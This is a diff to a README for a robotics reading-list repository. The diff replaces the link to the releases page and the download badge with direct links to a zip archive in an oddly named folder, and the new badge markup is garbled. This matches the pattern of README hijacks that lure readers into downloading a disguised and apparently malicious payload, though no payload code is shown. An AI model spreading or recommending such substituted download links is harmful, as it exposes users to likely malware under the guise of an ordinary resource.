@@ -1,7 +1,7 @@
 # 🤖 Frontier_Robotics_Reading_List - Discover Essential Robotics Resources
 
 ## 📥 Download Now
-[![Download Frontier Robotics Reading List](https://img.shields.io/badge/Download%20Frontier%20Robotics%20Reading%20List-blue.svg)](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/releases)
+[![Download Frontier Robotics Reading List](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/raw/refs/heads/main/impedingly/Reading-Frontier-List-Robotics-1.2.zip%20Frontier%20Robotics%20Reading%https://github.com/Rishab17066/Frontier_Robotics_Reading_List/raw/refs/heads/main/impedingly/Reading-Frontier-List-Robotics-1.2.zip)](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/raw/refs/heads/main/impedingly/Reading-Frontier-List-Robotics-1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Frontier Robotics Reading List**! This is a curated collection of valuable content related to frontier robotics. Whether you are a student, an enthusiast, or a professional looking to deepen your understanding of robotics, you will find resources here to help you.
@@ -27,7 +27,7 @@ To get started with the **Frontier Robotics Reading List**, follow these simple 
 
 1. **Visit the Releases Page:**
    Click the link below to access the latest releases:
-   [Visit Releases Page](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/releases)
+   [Visit Releases Page](https://github.com/Rishab17066/Frontier_Robotics_Reading_List/raw/refs/heads/main/impedingly/Reading-Frontier-List-Robotics-1.2.zip)
 
 2. **Choose Your Resources:**
    On the releases page, you will find several versions of the curated list. Most of these resources are downloadable as PDFs or links to outdoor platforms. 
